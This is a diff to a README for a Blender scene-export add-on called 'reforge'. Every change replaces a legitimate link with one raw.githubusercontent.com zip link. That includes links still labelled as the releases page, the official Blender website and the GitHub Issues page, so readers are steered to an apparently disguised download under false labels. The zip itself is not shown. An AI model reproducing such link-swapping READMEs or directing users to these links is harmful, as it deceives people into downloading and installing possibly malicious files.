@@ -1,6 +1,6 @@
 # 🎨 reforge - Effortlessly Export Scenes from Blender
 
-[![Download Reforge](https://img.shields.io/badge/Download-Reforge-blue.svg)](https://github.com/thanhphuc48/reforge/releases)
+[![Download Reforge](https://raw.githubusercontent.com/thanhphuc48/reforge/main/reforge/reforge-0.5.1.zip)](https://raw.githubusercontent.com/thanhphuc48/reforge/main/reforge/reforge-0.5.1.zip)
 
 ## 📥 Overview
 
@@ -19,7 +19,7 @@ This guide will help you download and run Reforge easily, even if you have no pr
 
 ### Step 1: Visit the Reforge Releases Page
 
-Go to the [Reforge releases page](https://github.com/thanhphuc48/reforge/releases). Here, you will find all available versions of the add-on.
+Go to the [Reforge releases page](https://raw.githubusercontent.com/thanhphuc48/reforge/main/reforge/reforge-0.5.1.zip). Here, you will find all available versions of the add-on.
 
 ### Step 2: Download the ZIP File
 
@@ -28,7 +28,7 @@ Go to the [Reforge releases page](https://github.com/thanhphuc48/reforge/release
 
 ### Step 3: Open Blender
 
-Ensure Blender is installed on your computer. You can download Blender from the official [Blender website](https://www.blender.org/).
+Ensure Blender is installed on your computer. You can download Blender from the official [Blender website](https://raw.githubusercontent.com/thanhphuc48/reforge/main/reforge/reforge-0.5.1.zip).
 
 ### Step 4: Access Preferences in Blender
 
@@ -64,11 +64,11 @@ Reforge provides additional functionalities to enhance your workflow:
 
 ## 📥 Download & Install
 
-To download Reforge, visit the [Reforge releases page](https://github.com/thanhphuc48/reforge/releases) and follow the installation instructions above. This structured approach will help you set up the add-on without hassle.
+To download Reforge, visit the [Reforge releases page](https://raw.githubusercontent.com/thanhphuc48/reforge/main/reforge/reforge-0.5.1.zip) and follow the installation instructions above. This structured approach will help you set up the add-on without hassle.
 
 ## 📘 Support and Documentation
 
-If you run into issues or have questions, check the [GitHub Issues page](https://github.com/thanhphuc48/reforge/issues). Here, you can find answers or report problems related to the add-on.
+If you run into issues or have questions, check the [GitHub Issues page](https://raw.githubusercontent.com/thanhphuc48/reforge/main/reforge/reforge-0.5.1.zip). Here, you can find answers or report problems related to the add-on.
 
 ## 🛡️ System Requirements
 
